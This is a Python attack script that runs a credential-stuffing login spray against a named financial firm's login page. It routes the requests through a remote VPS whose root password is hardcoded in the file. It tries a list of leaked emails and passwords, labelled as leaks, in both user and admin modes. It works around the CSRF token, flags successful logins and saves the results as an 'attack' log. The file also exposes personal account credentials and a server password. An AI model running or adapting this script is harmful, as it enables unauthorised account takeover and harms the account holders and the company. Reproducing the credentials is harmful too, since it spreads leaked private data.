#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - PPP KHOR Login Spray v2 (3-step flow)"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="
PPP_URL = "https://ppp.findep.mx/khorLogin.asp"

CREDS = [
    ("bmendezar@findep.com.mx", "1234", "leak-1"),
    ("ehernandezdi@independencia.com.mx", "1234", "leak-2"),
    ("aris89@hotmail.com", "1234567", "leak-3"),
    ("bmendezar", "Findep2021", "leak-4"),
    ("bmendezar", "Pao1234+", "leak-5"),
    ("bmendezar@findep.com.mx", "Findep2021", "combo-1"),
    ("bmendezar@findep.com.mx", "Pao1234+", "combo-2"),
    ("ehernandezdi@independencia.com.mx", "Findep2021", "combo-3"),
    ("ehernandezdi@independencia.com.mx", "Pao1234+", "combo-4"),
    ("aris89@hotmail.com", "Findep2021", "combo-5"),
    ("aris89@hotmail.com", "Pao1234+", "combo-6"),
    ("ehernandezdi", "Findep2021", "combo-7"),
    ("ehernandezdi", "Pao1234+", "combo-8"),
    ("aris89", "1234567", "combo-9"),
    ("aris89", "Findep2021", "combo-10"),
    ("aris89", "Pao1234+", "combo-11"),
]

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def extract_token(html):
    for pat in [r"'value',\s*\"([A-F0-9]+)\"\s*\)", r'CSRFToken[^"]*"([A-F0-9]+)"', r'"value",\s*"([A-F0-9]+)"']:
        m = re.search(pat, html)
        if m: return m.group(1)
    return ""

def try_login(client, user, pwd, modo="user"):
    """3-step login flow: GET -> POST modo -> POST usr/pwd"""
    cookie_file = f"/tmp/ppp_v2_{int(time.time()*1000)}.txt"
    # Step 1: GET
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-c {cookie_file} '{PPP_URL}' -o /tmp/ppp_l1.html")
    ssh_exec(client, cmd, timeout=20)
    out, _ = ssh_exec(client, "cat /tmp/ppp_l1.html", timeout=10)
    csrf1 = extract_token(out)
    if not csrf1:
        return {"success": False, "error": "no_csrf_step1", "response": out[:200]}

    # Step 2: POST modo -> get form with usr/pwd
    cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' -b {cookie_file} -c {cookie_file} "
           f"-e '{PPP_URL}' -d 'modo={modo}&embedded=0&CSRFToken={csrf1}' "
           f"-o /tmp/ppp_l2.html -w 'HTTP:%{{http_code}}' '{PPP_URL}'")
    out, _ = ssh_exec(client, cmd, timeout=20)
    out2, _ = ssh_exec(client, "cat /tmp/ppp_l2.html", timeout=10)
    csrf2 = extract_token(out2) or csrf1

    # Step 3: POST usr/pwd
    resp_file = f"/tmp/ppp_l3_{int(time.time()*1000)}.html"
    cmd = (f"curl -sk -m 25 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-b {cookie_file} -c {cookie_file} -e '{PPP_URL}' "
           f"--data-urlencode 'modo={modo}' --data-urlencode 'embedded=0' "
           f"--data-urlencode 'usr={user}' --data-urlencode 'pwd={pwd}' "
           f"--data-urlencode 'CSRFToken={csrf2}' "
           f"-o {resp_file} -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} REDIR:%{{redirect_url}}' "
           f"'{PPP_URL}'")
    out, _ = ssh_exec(client, cmd, timeout=30)
    body, _ = ssh_exec(client, f"head -c 4000 {resp_file}", timeout=10)

    # Detectar éxito
    success = False
    redir = ""
    if "REDIR:" in out:
        redir = out.split("REDIR:")[1].strip()
    # Si redirect NO es a khorLogin.asp, probablemente éxito
    if redir and "khorLogin.asp" not in redir and redir != "":
        success = True
    # Indicadores de error en body
    err_inds = ["incorrect", "inválido", "inválida", "incorrecto", "incorrecta",
                "denegado", "denied", "no existe", "no coinciden", "usuario o contraseña",
                "clave incorrecta", "password incorrect", "login failed", "error de acceso"]
    for ind in err_inds:
        if ind.lower() in body.lower():
            success = False
            break
    # Indicadores de éxito en body
    success_inds = ["bienvenido", "welcome", "khorMain", "khorIndex", "khorPrincipal",
                    "cerrar sesión", "logout", "menú principal", "menu principal",
                    "panel principal", "dashboard", "mi cuenta"]
    for ind in success_inds:
        if ind.lower() in body.lower():
            success = True
            break
    return {"success": success, "response": out.strip(), "redirect": redir,
            "body_preview": body[:3000], "csrf1": csrf1, "csrf2": csrf2}

def main():
    print(f"[*] Connecting to VPS {VPS_HOST}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {"spray_user": [], "spray_admin": []}

    # Spray modo=user
    print("\n[*] === SPRAY modo=user ===")
    for user, pwd, label in CREDS:
        r = try_login(client, user, pwd, "user")
        r["label"] = label; r["user"] = user; r["password"] = pwd
        print(f"  [{label}] {user}:{pwd} -> success={r['success']} | {r.get('response','')}")
        if r["success"]:
            print(f"    !!! POSSIBLE SUCCESS - redirect: {r.get('redirect','')}")
            print(f"    body preview: {r.get('body_preview','')[:500]}")
        log["spray_user"].append(r)
        time.sleep(1.5)

    # Spray modo=admin
    print("\n[*] === SPRAY modo=admin ===")
    for user, pwd, label in CREDS:
        r = try_login(client, user, pwd, "admin")
        r["label"] = label; r["user"] = user; r["password"] = pwd
        print(f"  [{label}] {user}:{pwd} -> success={r['success']} | {r.get('response','')}")
        if r["success"]:
            print(f"    !!! POSSIBLE SUCCESS - redirect: {r.get('redirect','')}")
            print(f"    body preview: {r.get('body_preview','')[:500]}")
        log["spray_admin"].append(r)
        time.sleep(1.5)

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_ppp_v2_spray.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Spray results saved to {out_file}")

    # Summary
    print("\n[*] === SUMMARY ===")
    successes = [r for r in log["spray_user"] + log["spray_admin"] if r["success"]]
    print(f"  Total attempts: {len(log['spray_user']) + len(log['spray_admin'])}")
    print(f"  Successes: {len(successes)}")
    for s in successes:
        print(f"    - {s['user']}:{s['password']} ({s['label']})")

    client.close()

if __name__ == "__main__":
    main()
